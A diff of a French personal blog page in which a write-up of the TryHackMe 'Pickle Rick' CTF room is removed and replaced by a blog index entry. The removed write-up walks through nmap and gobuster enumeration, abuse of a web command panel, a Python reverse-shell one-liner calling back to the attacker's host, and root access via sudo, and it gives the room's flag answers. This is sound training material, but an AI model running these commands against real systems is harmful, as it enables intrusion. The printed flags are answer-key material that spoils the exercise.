@@ -3,7 +3,7 @@
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Write-up : Pickle Rick sur TryHackMe - antoinedw.fr</title>
+        <title>Tryhackme - antoinedw.fr</title>
         
         
         <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/favicon_io/apple-touch-icon.png">
@@ -417,63 +417,22 @@
 </script> 
         <main>
             
-<div class="single-post w-full my-10">
-    <h1 class="text-4xl font-bold mb-4 text-text-primary-light dark:text-text-primary-dark">Write-up : Pickle Rick sur TryHackMe</h1>
-    
-    
-    <div class="prose prose-invert max-w-none">
-        <p><a href="https://tryhackme.com/room/picklerick">Lien vers le CTF sur TryHackMe</a></p>
-<p>Un CTF TryHackMe sur le thème de Rick et Morty ? Ça promet d&rsquo;être fun !
-Il semblerait que Rick s&rsquo;est accidentellement transformé en cornichon lors de l&rsquo;une de ses expériences. Il a besoin de quelqu&rsquo;un pour trouver trois ingrédients sur le serveur. Ces derniers vont permettre de créer une potion qui le retransformera en humain. Je me lance !</p>
-<h2 id="analyse-des-ports-ouverts-sur-le-serveur">Analyse des ports ouverts sur le serveur</h2>
-<p>Première chose que je peux essayer de faire c&rsquo;est d&rsquo;analyser quels sont les ports ouverts sur le serveur. Pour ça, j&rsquo;utilise <code>nmap</code> avec le paramètre <code>-p-</code> pour lui demander de scanner tous les ports de 1 à 65535. J&rsquo;utilise aussi le paramètre <code>-oN [file]</code> pour sauvegarder le résultat du scan dans un fichier au cas où je voudrais le retrouver plus tard.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir nmap
-</span></span><span style="display:flex;"><span>nmap -p- -oN nmap/allports.txt <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p><img src="/img/writeup-pickle-rick/nmap.png" alt="Résultat de nmap" title="Résultat de nmap"></p>
-<p>Il semblerait qu&rsquo;il y ai simplement une connexion SSH ouverte sur le port 22 et un serveur web sur le port 80.</p>
-<h2 id="analyse-du-serveur-web">Analyse du serveur web</h2>
-<p>Je vais jeter une oeil au serveur web en ouvrant l&rsquo;adresse ip sur Firefox.</p>
-<p>Ça a l&rsquo;air d&rsquo;être un site web classique. Première chose que je peux faire c&rsquo;est d&rsquo;analyser le code source de la page. J&rsquo;y ai trouvé un commentaire laissé par Rick me permettant d&rsquo;avoir un premier nom d&rsquo;utilisateur : <code>R1ckRul3s</code>. Je pourrais peut-être l&rsquo;utiliser pour me connecter au serveur en SSH.</p>
-<p>Comme il n&rsquo;y a pas plus d&rsquo;informations sur cette page d&rsquo;accueil, je vais lancer <code>gobuster</code> pour tenter de trouver d&rsquo;autres pages présentes sur le serveur web.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://<span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> -w /usr/share/wordlists/dirb/common.txt
-</span></span></code></pre></div><p><img src="/img/writeup-pickle-rick/gobuster.png" alt="Résultat de gobuster" title="Résultat de gobuster"></p>
-<p>J&rsquo;ai trouvé un dossier <code>/assets</code> dans lequel il n&rsquo;y avait rien d&rsquo;interessant, à part des images, bootstrap et jquery.</p>
-<p>J&rsquo;ai aussi jeté un oeil au <code>robots.txt</code> remonté par <code>gobuster</code> et j&rsquo;y ai trouvé une information qu&rsquo;on ne trouve pas souvent dans ce genre de fichier : <code>Wubbalubbadubdub</code>. Je garde ça de côté pour plus tard, ça pourra peut-être servir.</p>
-<p>Rien de très intéréssant pour l&rsquo;instant. Je vais tenter de relancer <code>gobuster</code> pour chercher cette fois-ci des fichiers <code>.php</code> sur le serveur web avec le paramètre <code>-x php</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://<span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> -w /usr/share/wordlists/dirb/common.txt -x php
-</span></span></code></pre></div><p>Bingo, on trouve des pages très interessantes : <code>login.php</code>, <code>denied.php</code> et <code>portal.php</code>.</p>
-<p><img src="/img/writeup-pickle-rick/gobuster-php.png" alt="Résultat de gobuster en mode php" title="Résultat de gobuster en mode php"></p>
-<p>Les pages <code>portal.php</code> et <code>denied.php</code> me redirigent toutes les deux vers <code>login.php</code>. Je vais donc me concentrer sur cette dernière. C&rsquo;est une simple page qui me demande d&rsquo;entrer un nom d&rsquo;utilisateur et un mot de passe.</p>
-<h2 id="connexion-au-site-web-et-premier-ingrédient">Connexion au site web et premier ingrédient</h2>
-<p>Je vais analyser une fois de plus le code source de la page <code>login.php</code> pour essayer d&rsquo;y trouver des informations&hellip; Rien d&rsquo;interessant. J&rsquo;ai tenté une connexion avec le nom d&rsquo;utilisateur trouvé précédemment : <code>R1ckRul3s</code> et <code>Wubbalubbadubdub</code> comme mot de passe&hellip; Et ça a fonctionné ! Je suis connecté à la page <code>portal.php</code>.</p>
-<p>Une fois de plus je vais analyser le code source de la page avant de commencer quoi que ce soit. J&rsquo;y ai trouvé une information qui semble être encodée en <code>base64</code> : <code>Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==</code>.</p>
-<p>Après avoir bidouillé avec <a href="https://gchq.github.io">CyberChef</a>, j&rsquo;ai découvert qu&rsquo;il s&rsquo;agissait d&rsquo;une phrase encodée 7 fois d&rsquo;affilée en <code>base64</code> qui, une fois décodée, donne le résultat suivant : <code>rabbit hole</code>. Je me suis fait avoir, encore une blague de Rick pour me faire perdre du temps !</p>
-<p>De retour sur la page <code>portal.php</code>, je me rend compte qu&rsquo;il s&rsquo;agit d&rsquo;une interface de commande qui permet d&rsquo;intéragir avec le serveur. En listant les fichiers présents dans le serveur avec <code>ls</code> je vois qu&rsquo;il existe un fichier <code>Sup3rS3cretPickl3Ingred.txt</code>.</p>
-<p><img src="/img/writeup-pickle-rick/ls.png" alt="Liste des fichiers présents sur le serveur"></p>
-<p>Lorsque je tente un <code>cat Sup3rS3cretPickl3Ingred.txt</code> j&rsquo;obtiens une erreur. Il semblerait que Rick ai désactivé certaines commandes pour empêcher les utilisateurs d&rsquo;avoir un contrôle entier sur le serveur. Mais bon, comme il y a un serveur web qui tourne sur la machine, il me suffit d&rsquo;ouvrir le fichier <code>/Sup3rS3cretPickl3Ingred.txt</code> dans Firefox pour découvrir son contenu : <code>mr. meeseek hair</code>. Premier ingrédient obtenu ! Il m&rsquo;en reste deux à trouver.</p>
-<h2 id="accès-au-serveur-via-un-reverse-shell">Accès au serveur via un reverse shell</h2>
-<p>Comme j&rsquo;ai la possiblité d&rsquo;éxécuter des commande sur le serveur, j&rsquo;aimerai voir s&rsquo;il existe un moyen d&rsquo;y éxécuter un reverse shell pour mettre un premier vrai pas dans le serveur.</p>
-<p>En énumerant mes possiblités, j&rsquo;ai éxécuté la commande <code>which python3</code> pour voir si Python 3 était installé sur le serveur, et c&rsquo;est le cas ! La voilà ma porte d&rsquo;entrée.</p>
-<p>Je lance un serveur Netcat sur ma machine en écoute sur le port 4444.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
-</span></span></code></pre></div><p>Il me reste plus qu&rsquo;à trouver un reverse shell utilisant Python 3 grâce à <a href="https://www.revshells.com/">RevShells</a>, à l&rsquo;éxécuter dans l&rsquo;éxécution de commande présente sur le serveur web et le tour est joué.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;[ip]&#34;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span></code></pre></div><p>Bingo ! Je suis connecté à la machine.</p>
-<h2 id="stabilisation-du-shell-et-second-ingrédient">Stabilisation du shell et second ingrédient</h2>
-<p>Comme je sais que Python 3 est installé, je vais prendre le temps de stabiliser le shell pour nottament avoir accès à l&rsquo;autocomplétion de mes commandes.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
-</span></span></code></pre></div><p><code>CTRL + Z</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stty raw -echo; fg
-</span></span></code></pre></div><p>Maintenant que c&rsquo;est fait, je vais pouvoir prendre le temps d&rsquo;analyser le serveur pour trouver les deux derniers ingrédients. En fouillant dans les dossiers principaux, j&rsquo;ai eu accès au dossier personnel de Rick <code>/home/rick</code> et j&rsquo;y ai trouvé le second ingrédient : <code>1 jerry tear</code>.</p>
-<h2 id="élévation-des-privilèges-et-troisième-ingrédient">Élévation des privilèges et troisième ingrédient</h2>
-<p>En continuant mon exploration du serveur j&rsquo;ai voulu voir si mon utilisateur avait des accès <code>sudo</code> sur certains fichiers ou programmes.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
-</span></span></code></pre></div><p><img src="/img/writeup-pickle-rick/sudo.png" alt="Résultat sudo -l" title="Résultat de sudo -l"></p>
-<p>Magnifique ! Il se trouve que le serveur est très mal configuré et que mon utilisateur <code>www-data</code> possède des accès complet en tant que super utilisateur. Il ne me reste plus qu&rsquo;à passer sur l&rsquo;utilisateur <code>root</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
-</span></span></code></pre></div><p>Maintenant que j&rsquo;ai tous les accès sur le serveur, je peux me déplacer vers le dossier <code>/root</code> pour y trouver le troisième et dernier ingrédient : <code>fleeb juice</code>.</p>
-
+<div class="container mx-auto my-10">
+    <h1 class="text-4xl font-bold mb-8 text-text-primary-light dark:text-text-primary-dark">Blog</h1>
+    <div class="space-y-6">
+        
+        <article class="[&:not(:last-child)]:border-b border-gray-200 dark:border-gray-700 pt-0 pb-6">
+            <h2 class="text-2xl font-semibold mb-2">
+                <a href="/fr/blog/writeup-pickle-rick/" class="text-accent-light dark:text-accent-dark hover:text-text-primary-light dark:hover:text-text-primary-dark">Write-up : Pickle Rick sur TryHackMe</a>
+            </h2>
+            
+            <p class="text-text-secondary-light dark:text-text-secondary-dark">Un CTF TryHackMe sur le thème de Rick et Morty ? Ça promet d&#39;être fun !</p>
+            
+            
+            <time class="text-sm text-text-secondary-light dark:text-text-secondary-dark">05/12/2025</time>
+            
+        </article>
+        
     </div>
 </div>
 
